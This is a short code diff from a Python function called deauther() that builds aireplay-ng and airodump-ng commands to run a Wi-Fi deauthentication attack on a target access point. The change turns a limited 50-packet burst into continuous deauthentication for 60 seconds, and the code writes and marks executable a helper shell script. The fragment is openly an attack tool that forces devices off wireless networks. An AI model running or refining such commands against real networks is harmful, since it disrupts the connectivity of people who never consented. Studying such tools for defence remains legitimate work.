@@ -1555,7 +1555,7 @@ def deauther():
     #cmd = "airodump-ng -c " + str(target[1] )+" --bssid " + str(target[2]) + " wlan0mon && echo 'finito' "
     ##cmd2 =  "aireplay-ng -0 10 -a " + str(target[2]) + " wlan0mon"
     tx1="timeout 2s airodump-ng -c " + str(target[1] )+" --bssid " + str(target[2]) + " wlan0mon"
-    tx2= "timeout 20s aireplay-ng -0 50 -a " + str(target[2]) + " wlan0mon"
+    tx2= "timeout 60s aireplay-ng -0 0 -a " + str(target[2]) + " wlan0mon"
     cmd ="touch touchedcommand.sh && echo '#!/bin/bash\n"+ tx1 +" &' > touchedcommand.sh && chmod +x touchedcommand.sh"
     res = execcmd(cmd)
     if(res==-1):
